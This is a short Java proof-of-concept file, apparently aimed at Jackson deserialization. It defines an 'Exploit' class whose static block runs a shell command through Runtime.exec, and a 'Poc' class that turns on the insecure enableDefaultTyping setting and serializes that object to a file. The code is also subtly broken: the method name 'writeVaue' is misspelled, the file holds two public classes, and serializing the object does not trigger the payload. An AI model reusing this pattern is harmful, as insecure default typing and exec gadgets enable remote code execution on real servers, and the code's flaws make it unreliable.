import com.fasterxml.jackson.databind.ObjectMapper;
import java.io.IOException;
import java.io.File;

import java.lang.Runtime;
public class Exploit {
	static {
		try {
			Runtime.getRuntime().exec("id");
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}

public class Poc {
	public static void main(String[] args) throws Exception {
		ObjectMapper mapper = new ObjectMapper();
		mapper.enableDefaultTyping();

		// Serialize Exploit class
		Exploit exploit = new Exploit();
		mapper.writeVaue(new File("exploit.ser"), exploit);
	}
}

